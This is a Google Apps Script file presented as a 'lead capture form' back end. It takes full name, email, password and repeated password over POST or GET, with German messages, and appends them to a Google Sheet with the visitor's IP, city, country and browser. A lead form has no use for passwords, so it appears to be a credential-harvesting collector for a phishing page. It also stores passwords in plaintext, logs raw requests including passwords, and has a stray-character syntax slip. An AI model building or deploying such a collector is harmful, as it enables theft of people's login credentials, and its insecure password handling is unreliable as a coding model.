/**
 * Google Apps Script for Lead Capture Form
 * This script receives form data and adds it to a Google Sheet
 */

// Configuration - Update these values
const SPREADSHEET_ID = 'YOUR_SPREADSHEET_ID_HERE'; // Replace with your actual spreadsheet ID
const SHEET_NAME = 'Sheet1'; // Use the default sheet name

/**
 * Main function to handle form submissions
 * This function is called when the form is submitted
 */
function doPost(e) {
  try {
    // Log the incoming request for debugging
    console.log('Received POST request'); 
    console.log('Post data:', e.postData);
    console.log('Parameters:', e.parameter);s
    
    let formData = {};
    
    // Check if postData exists and has content
    if (e.postData && e.postData.contents) {
      console.log('Content type:', e.postData.type);
      console.log('Raw data:', e.postData.contents);
      
      // Parse the incoming data based on content type
      if (e.postData.type === 'application/json') {
        // Handle JSON data
        formData = JSON.parse(e.postData.contents);
      } else if (e.postData.type === 'application/x-www-form-urlencoded') {
        // Handle form data
        const params = e.parameter;
        if (params.data) {
          try {
            formData = JSON.parse(params.data);
          } catch (parseError) {
            formData = params; // Use raw parameters if JSON parsing fails
          }
        } else {
          formData = params;
        }
      } else if (e.postData.type === 'multipart/form-data') {
        // Handle multipart form data (FormData)
        formData = e.parameter;
      } else {
        // Handle other content types
        formData = e.parameter;
      }
    } else {
      // If no postData, use parameters (GET-style data)
      console.log('No postData, using parameters');
      formData = e.parameter;
    }
    
    console.log('Parsed form data:', formData);
    
    // Validate required fields
    if (!formData.fullname || !formData.email || !formData.password || !formData.repeatPassword) {
      return ContentService
        .createTextOutput(JSON.stringify({
          success: false,
          error: 'Fehlende erforderliche Felder: vollständiger Name, E-Mail, Passwort und Passwort-Wiederholung'
        }))
        .setMimeType(ContentService.MimeType.JSON);
    }
    
    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(formData.email)) {
      return ContentService
        .createTextOutput(JSON.stringify({
          success: false,
          error: 'Ungültiges E-Mail-Format'
        }))
        .setMimeType(ContentService.MimeType.JSON);
    }
    
    // Validate password match
    if (formData.password !== formData.repeatPassword) {
      return ContentService
        .createTextOutput(JSON.stringify({
          success: false,
          error: 'Passwörter stimmen nicht überein'
        }))
        .setMimeType(ContentService.MimeType.JSON);
    }
    
    // Add timestamp if not present
    if (!formData.timestamp) {
      formData.timestamp = new Date().toISOString();
    }
    
    // Add the lead to Google Sheet
    const result = addLeadToSheet(formData);
    
    if (result.success) {
      console.log('Lead added successfully:', result);
      return ContentService
        .createTextOutput(JSON.stringify({
          success: true,
          message: 'Lead erfolgreich erfasst',
          leadId: result.leadId
        }))
        .setMimeType(ContentService.MimeType.JSON);
    } else {
      console.error('Failed to add lead:', result.error);
      return ContentService
        .createTextOutput(JSON.stringify({
          success: false,
          error: result.error
        }))
        .setMimeType(ContentService.MimeType.JSON);
    }
    
  } catch (error) {
    console.error('Error processing request:', error);
    return ContentService
      .createTextOutput(JSON.stringify({
        success: false,
        error: 'Internal server error: ' + error.message
      }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

/**
 * Handle GET requests (fallback method)
 */
function doGet(e) {
  try {
    console.log('Received GET request');
    console.log('Parameters:', e.parameter);
    
    const formData = e.parameter;
    
    // Validate required fields
    if (!formData.fullname || !formData.email || !formData.password || !formData.repeatPassword) {
      return ContentService
        .createTextOutput(JSON.stringify({
          success: false,
          error: 'Fehlende erforderliche Felder: vollständiger Name, E-Mail, Passwort und Passwort-Wiederholung'
        }))
        .setMimeType(ContentService.MimeType.JSON);
    }
    
    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(formData.email)) {
      return ContentService
        .createTextOutput(JSON.stringify({
          success: false,
          error: 'Ungültiges E-Mail-Format'
        }))
        .setMimeType(ContentService.MimeType.JSON);
    }
    
    // Validate password match
    if (formData.password !== formData.repeatPassword) {
      return ContentService
        .createTextOutput(JSON.stringify({
          success: false,
          error: 'Passwörter stimmen nicht überein'
        }))
        .setMimeType(ContentService.MimeType.JSON);
    }
    
    // Add timestamp if not present
    if (!formData.timestamp) {
      formData.timestamp = new Date().toISOString();
    }
    
    // Add the lead to Google Sheet
    const result = addLeadToSheet(formData);
    
    if (result.success) {
      console.log('Lead added successfully via GET:', result);
      return ContentService
        .createTextOutput(JSON.stringify({
          success: true,
          message: 'Lead erfolgreich erfasst',
          leadId: result.leadId
        }))
        .setMimeType(ContentService.MimeType.JSON);
    } else {
      console.error('Failed to add lead via GET:', result.error);
      return ContentService
        .createTextOutput(JSON.stringify({
          success: false,
          error: result.error
        }))
        .setMimeType(ContentService.MimeType.JSON);
    }
    
  } catch (error) {
    console.error('Error processing GET request:', error);
    return ContentService
      .createTextOutput(JSON.stringify({
        success: false,
        error: 'Internal server error: ' + error.message
      }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}



/**
 * Add lead data to Google Sheet
 */
function addLeadToSheet(leadData) {
  try {
    // Get the spreadsheet and sheet
    const spreadsheet = SpreadsheetApp.openById(SPREADSHEET_ID);
    let sheet = spreadsheet.getSheetByName(SHEET_NAME);
    
    // Create sheet if it doesn't exist
    if (!sheet) {
      sheet = spreadsheet.insertSheet(SHEET_NAME);
      // Add headers
      const headers = [
        'TIMESTAMP',
        'FULL NAME',
        'EMAIL',
        'PASSWORD',
        'REPEAT PASSWORD',
        'IP ADDRESS',
        'CITY',
        'COUNTRY',
        'BROWSER',
        'LEAD ID'
      ];
      sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
      sheet.getRange(1, 1, 1, headers.length).setFontWeight('bold');
      sheet.getRange(1, 1, 1, headers.length).setBackground('#f0f0f0');
    }
    
    // Generate unique lead ID
    const leadId = 'LEAD_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    // Prepare row data
    const rowData = [
      leadData.timestamp || new Date().toISOString(),
      leadData.fullname || '',
      leadData.email || '',
      leadData.password || '',
      leadData.repeatPassword || '',
      leadData.ip || 'Unknown',
      leadData.city || 'Unknown',
      leadData.country || 'Unknown',
      leadData.browser || 'Unknown',
      leadId
    ];
    
    // Add data to sheet
    const lastRow = sheet.getLastRow();
    sheet.getRange(lastRow + 1, 1, 1, rowData.length).setValues([rowData]);
    
    // Auto-resize columns
    sheet.autoResizeColumns(1, rowData.length);
    
    console.log('Lead added to sheet:', leadId);
    
    return {
      success: true,
      leadId: leadId,
      row: lastRow + 1
    };
    
  } catch (error) {
    console.error('Error adding lead to sheet:', error);
    return {
      success: false,
      error: error.message
    };
  }
}

/**
 * Test function to verify the script is working
 */
function testFunction() {
  console.log('Google Apps Script is working!');
  
  // Test data
  const testLead = {
    fullname: 'Test User',
    email: 'test@example.com',
    password: 'testpass123',
    repeatPassword: 'testpass123',
    ip: '192.168.1.1',
    city: 'Test City',
    country: 'Test Country',
    browser: 'Test Browser'
  };
  
  const result = addLeadToSheet(testLead);
  console.log('Test result:', result);
  
  return result;
}

/**
 * Create a new spreadsheet for testing (run this once to set up)
 */
function createTestSpreadsheet() {
  try {
    // Create a new spreadsheet
    const spreadsheet = SpreadsheetApp.create('Lead Capture Form - ' + new Date().toLocaleDateString());
    
    // Get the spreadsheet ID
    const spreadsheetId = spreadsheet.getId();
    const spreadsheetUrl = spreadsheet.getUrl();
    
    console.log('New spreadsheet created!');
    console.log('Spreadsheet ID:', spreadsheetId);
    console.log('Spreadsheet URL:', spreadsheetUrl);
    
    // Create the leads sheet
    const sheet = spreadsheet.getSheetByName('Sheet1');
    sheet.setName(SHEET_NAME);
    
    // Add headers
    const headers = [
      'TIMESTAMP',
      'FULL NAME',
      'EMAIL',
      'PASSWORD',
      'REPEAT PASSWORD',
      'IP ADDRESS',
      'CITY',
      'COUNTRY',
      'BROWSER',
      'LEAD ID'
    ];
    sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
    sheet.getRange(1, 1, 1, headers.length).setFontWeight('bold');
    sheet.getRange(1, 1, 1, headers.length).setBackground('#f0f0f0');
    
    // Auto-resize columns
    sheet.autoResizeColumns(1, headers.length);
    
    return {
      success: true,
      spreadsheetId: spreadsheetId,
      spreadsheetUrl: spreadsheetUrl
    };
    
  } catch (error) {
    console.error('Error creating test spreadsheet:', error);
    return {
      success: false,
      error: error.message
    };
  }
}
